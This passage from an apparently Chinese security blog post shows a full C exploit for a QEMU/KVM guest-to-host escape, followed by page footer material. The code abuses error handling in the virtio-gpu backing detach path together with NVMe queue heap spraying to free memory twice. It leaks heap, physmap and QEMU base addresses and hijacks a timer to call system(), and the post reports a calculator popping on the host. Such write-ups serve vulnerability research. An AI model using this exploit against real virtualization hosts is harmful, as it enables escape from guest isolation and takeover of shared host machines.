VIRTIO_GPU_CMD_RESOURCE_CREATE_2D       0x101</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING  0x106</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_nvme_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> val)</span>&#123;    <br>    *(<span class="hljs-type">uint32_t</span>*)(mmio_nvme + addr) = val;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_gpu_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> val)</span>&#123;    <br>    *(<span class="hljs-type">uint32_t</span>*)(mmio_gpu + addr) = val;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_nvme</span><span class="hljs-params">()</span> &#123;<br>    mmio_nvme_write(<span class="hljs-number">0x14</span>, <span class="hljs-number">0</span>);				<span class="hljs-comment">// nvme_clear_ctrl</span><br>    mmio_nvme_write(<span class="hljs-number">0x24</span>, <span class="hljs-number">0xff00ff</span>);         <span class="hljs-comment">// n-&gt;bar.aqa</span><br>	mmio_nvme_write(<span class="hljs-number">0x28</span>, gva_to_gpa(nvme_cmd));<br>	mmio_nvme_write(<span class="hljs-number">0x2c</span>, gva_to_gpa(nvme_cmd) &gt;&gt; <span class="hljs-number">32</span>);<br><br>	<span class="hljs-type">uint32_t</span> data = <span class="hljs-number">1</span>;<br>	data |= <span class="hljs-number">6</span> &lt;&lt; <span class="hljs-number">16</span>;				<span class="hljs-comment">//  sqes</span><br>	data |= <span class="hljs-number">4</span> &lt;&lt; <span class="hljs-number">20</span>;				<span class="hljs-comment">//	cqes</span><br>	mmio_nvme_write(<span class="hljs-number">0x14</span>, data);	<span class="hljs-comment">// nvme_start_ctrl</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_inc_sq_head</span><span class="hljs-params">()</span>&#123;<br>    sq_tail = sq_tail + <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_create_cq</span><span class="hljs-params">(<span class="hljs-type">int</span> cqid)</span>&#123;<br>    nvme_cmd[sq_tail].opcode = NVME_ADM_CMD_CREATE_CQ;<br>    nvme_cmd[sq_tail].prp1 = gva_to_gpa(nvme_buf);<br><br>    NvmeCreateCq *nvme_create = (NvmeCreateCq *)(nvme_cmd + sq_tail);<br>    nvme_create-&gt;cqid = cqid;<br>    nvme_create-&gt;irq_vector = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;cq_flags = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;qsize = <span class="hljs-number">1</span>;<br>    nvme_inc_sq_head();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_create_sq</span><span class="hljs-params">(<span class="hljs-type">int</span> sqid, <span class="hljs-type">int</span> qsize)</span>&#123;<br>    <br>    nvme_cmd[sq_tail].opcode = NVME_ADM_CMD_CREATE_SQ;<br>    nvme_cmd[sq_tail].prp1 = gva_to_gpa(nvme_buf);<br>    <br>    NvmeCreateSq *nvme_create = (NvmeCreateSq *)(nvme_cmd + sq_tail);<br>    nvme_create-&gt;cqid = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;sqid = sqid;<br>    nvme_create-&gt;sq_flags = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;qsize = qsize;<br>    nvme_inc_sq_head();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_del_sq</span><span class="hljs-params">(<span class="hljs-type">int</span> sqid)</span>&#123;<br>    nvme_cmd[sq_tail].opcode = NVME_ADM_CMD_DELETE_SQ;<br>    NvmeCreateSq *nvme_del = (NvmeCreateSq *)(nvme_cmd + sq_tail);<br>    nvme_del-&gt;sqid = sqid;<br>    nvme_inc_sq_head();<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">0.5</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">int</span> sqid)</span>&#123;<br>    <span class="hljs-built_in">memset</span>(nvme_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> NvmeCmd));<br>    nvme_cmd[<span class="hljs-number">0</span>].opcode = NVME_CMD_READ;<br>    nvme_cmd[<span class="hljs-number">0</span>].prp1 = <span class="hljs-number">0xfe000000</span> + <span class="hljs-number">0xc00</span>;<br>    nvme_cmd[<span class="hljs-number">0</span>].nsid = <span class="hljs-number">1</span>;<br>    NvmeRwCmd *rwcmd = (NvmeRwCmd *)(nvme_cmd);<br>    rwcmd-&gt;nlb = <span class="hljs-number">7</span>;<br>    rwcmd-&gt;slba = <span class="hljs-number">1</span>;<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span> + sqid * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_gpu</span><span class="hljs-params">()</span>&#123;<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_STATUS, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_SELECT, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_SIZE, <span class="hljs-number">0x100</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_DESCLO, gva_to_gpa(desc));<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_DESCHI, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_AVAILLO, gva_to_gpa(avail));<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_AVAILHI, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_ENABLE, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_mapping_table</span><span class="hljs-params">()</span>&#123;<br>    avail-&gt;idx = <span class="hljs-number">2</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> *<span class="hljs-title">c2d</span> =</span> buf + <span class="hljs-number">0x100</span>;<br>    c2d-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;<br>    c2d-&gt;resource_id = <span class="hljs-number">1</span>;<br>    c2d-&gt;format = <span class="hljs-number">1</span>;<br>    c2d-&gt;width = <span class="hljs-number">0x100</span>;<br>    c2d-&gt;height = <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> *<span class="hljs-title">ab</span> =</span> buf + <span class="hljs-number">0x200</span>;<br>    ab-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;<br>    ab-&gt;resource_id = <span class="hljs-number">1</span>;<br>    ab-&gt;nr_entries = <span class="hljs-number">20</span>;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> *<span class="hljs-title">ents</span> =</span> buf + <span class="hljs-number">0x300</span>;<br>    ents[<span class="hljs-number">0</span>].addr = gva_to_gpa(payload_buf + <span class="hljs-number">2</span>);<br>    ents[<span class="hljs-number">0</span>].length = <span class="hljs-number">0x100</span>;<br>    ents[<span class="hljs-number">1</span>].addr = <span class="hljs-number">0</span>;<br>    ents[<span class="hljs-number">1</span>].length = <span class="hljs-number">0</span>;<br><br>    desc[<span class="hljs-number">0</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(c2d);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_create_2d);<br><br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(ab);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_attach_backing);<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">20</span>; i++)&#123;<br>        desc[i].flags = VRING_DESC_F_NEXT;<br>        desc[i].addr = gva_to_gpa(ents);<br>        desc[i].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_mem_entry);<br>        desc[i].next = i + <span class="hljs-number">1</span>;<br>    &#125;<br>    desc[<span class="hljs-number">7</span>].addr = gva_to_gpa(ents + <span class="hljs-number">1</span>);<br>    desc[<span class="hljs-number">20</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">20</span>].addr = gva_to_gpa(buf + <span class="hljs-number">0x40</span>);<br>    desc[<span class="hljs-number">20</span>].len = <span class="hljs-number">0x20</span>;<br><br>    mmio_gpu_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_mapping_table1</span><span class="hljs-params">()</span>&#123;<br>    avail-&gt;idx = <span class="hljs-number">3</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> *<span class="hljs-title">c2d</span> =</span> buf + <span class="hljs-number">0x100</span>;<br>    c2d-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;<br>    c2d-&gt;resource_id = <span class="hljs-number">2</span>;<br>    c2d-&gt;format = <span class="hljs-number">1</span>;<br>    c2d-&gt;width = <span class="hljs-number">0x100</span>;<br>    c2d-&gt;height = <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> *<span class="hljs-title">ab</span> =</span> buf + <span class="hljs-number">0x200</span>;<br>    ab-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;<br>    ab-&gt;resource_id = <span class="hljs-number">2</span>;<br>    ab-&gt;nr_entries = <span class="hljs-number">20</span>;<br>    <br>    desc[<span class="hljs-number">0</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(c2d);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_create_2d);<br>    desc[<span class="hljs-number">0</span>].next = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">21</span>; i++)&#123;<br>        desc[i].flags = VRING_DESC_F_NEXT;<br>        desc[i].addr = gva_to_gpa(exec_cmd);<br>        desc[i].len = <span class="hljs-number">0x20</span>;<br>        desc[i].next = i + <span class="hljs-number">1</span>;<br>    &#125;<br><br>    desc[<span class="hljs-number">21</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">21</span>].addr = gva_to_gpa(exec_cmd);<br>    desc[<span class="hljs-number">21</span>].len = <span class="hljs-number">0x20</span>;<br><br>    mmio_gpu_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_mapping_table2</span><span class="hljs-params">()</span>&#123;<br>    avail-&gt;idx = <span class="hljs-number">5</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> *<span class="hljs-title">c2d</span> =</span> buf + <span class="hljs-number">0x100</span>;<br>    c2d-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;<br>    c2d-&gt;resource_id = <span class="hljs-number">3</span>;<br>    c2d-&gt;format = <span class="hljs-number">1</span>;<br>    c2d-&gt;width = <span class="hljs-number">0x100</span>;<br>    c2d-&gt;height = <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> *<span class="hljs-title">ab</span> =</span> buf + <span class="hljs-number">0x200</span>;<br>    ab-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;<br>    ab-&gt;resource_id = <span class="hljs-number">3</span>;<br>    ab-&gt;nr_entries = <span class="hljs-number">20</span>;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> *<span class="hljs-title">ents</span> =</span> buf + <span class="hljs-number">0x300</span>;<br>    ents[<span class="hljs-number">0</span>].addr = gva_to_gpa(payload_buf + <span class="hljs-number">2</span>);<br>    ents[<span class="hljs-number">0</span>].length = <span class="hljs-number">0x100</span>;<br>    ents[<span class="hljs-number">1</span>].addr = <span class="hljs-number">0</span>;<br>    ents[<span class="hljs-number">1</span>].length = <span class="hljs-number">0</span>;<br><br>    desc[<span class="hljs-number">0</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(c2d);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_create_2d);<br><br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(ab);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_attach_backing);<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">20</span>; i++)&#123;<br>        desc[i].flags = VRING_DESC_F_NEXT;<br>        desc[i].addr = gva_to_gpa(ents);<br>        desc[i].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_mem_entry);<br>        desc[i].next = i + <span class="hljs-number">1</span>;<br>    &#125;<br>    desc[<span class="hljs-number">7</span>].addr = gva_to_gpa(ents + <span class="hljs-number">1</span>);<br>    desc[<span class="hljs-number">20</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">20</span>].addr = gva_to_gpa(buf + <span class="hljs-number">0x40</span>);<br>    desc[<span class="hljs-number">20</span>].len = <span class="hljs-number">0x20</span>;<br><br>    mmio_gpu_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio_nvme         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span>  mmio_fd1 = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:05.0/resource4&quot;</span>, O_RDWR | O_SYNC);<br>    mmio_gpu         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd1, <span class="hljs-number">0</span>);<br><br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    avail = buf;<br>    payload_buf = buf + <span class="hljs-number">0x400</span>;<br><br>    desc_buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(desc_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    desc = desc_buf;<br><br>    nvme_buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(nvme_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    nvme_cmd = nvme_buf;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 1 heap spray&quot;</span>);<br>    init_nvme();<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x28</span>; ++i)&#123;<br>        nvme_create_cq(i);<br>    &#125;<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 2 set mapping table for free&quot;</span>);<br>    init_gpu();<br>    set_mapping_table();<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//本地初始0x150的tcache只有4个，g_free(ents)后ents也会进入，所以需要多创建一个sq</span><br>    nvme_create_sq(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>    nvme_create_sq(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 3 free the vuln_addr&quot;</span>);<br>    payload_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x291</span>;<br>    payload_buf[<span class="hljs-number">0x53</span>] = <span class="hljs-number">0x21</span>;<br>    vuln(<span class="hljs-number">2</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">size_t</span> leak_heap_addr = payload_buf[<span class="hljs-number">2</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_heap_addr_is %#lx\n&quot;</span>, leak_heap_addr);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 4 leak host&#x27;s physmap addr in qemu&quot;</span>);<br>    set_mapping_table1();<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">size_t</span> physmap_addr = payload_buf[<span class="hljs-number">0x28</span>];<br>    <span class="hljs-type">size_t</span> physmap_base = physmap_addr - gva_to_gpa(exec_cmd);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_host_physmap_addr_is %#lx\n&quot;</span>, physmap_addr);<br>    sleep(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 5 free vuln_addr&quot;</span>);<br>    payload_buf = buf + <span class="hljs-number">0x800</span>;<br>    set_mapping_table2();<br>    nvme_create_sq(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>);<br>    nvme_create_sq(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br>    payload_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x41</span>;<br>    payload_buf[<span class="hljs-number">9</span>] = <span class="hljs-number">0x21</span>;<br>    vuln(<span class="hljs-number">4</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    nvme_create_sq(<span class="hljs-number">5</span>, <span class="hljs-number">1</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 6 leak qemu addr and hijack timer&quot;</span>);<br>    <span class="hljs-type">size_t</span> elf_addr = payload_buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">size_t</span> elf_base = elf_addr - <span class="hljs-number">0x517c76</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base + <span class="hljs-number">0x2bc790</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_elf_addr_is %#lx\n&quot;</span>, elf_addr);<br>    payload_buf[<span class="hljs-number">4</span>] = system_plt;<br>    payload_buf[<span class="hljs-number">5</span>] = physmap_addr;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start escape&quot;</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span> + <span class="hljs-number">5</span> * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后弹出计算器</p>
+<img src="/img/22/Screenshot 2023-10-18 214923.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>​                                    </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Misuse Error Handling Leading To QEMU/KVM Escape</div>
+      <div>https://xtxtn.github.io/2023/10/12/ErrorHandling/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xtxtn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月12日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年10月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/11/CVE-2020-14364/" title="CVE-2020-14364">
+                        <span class="hidden-mobile">CVE-2020-14364</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
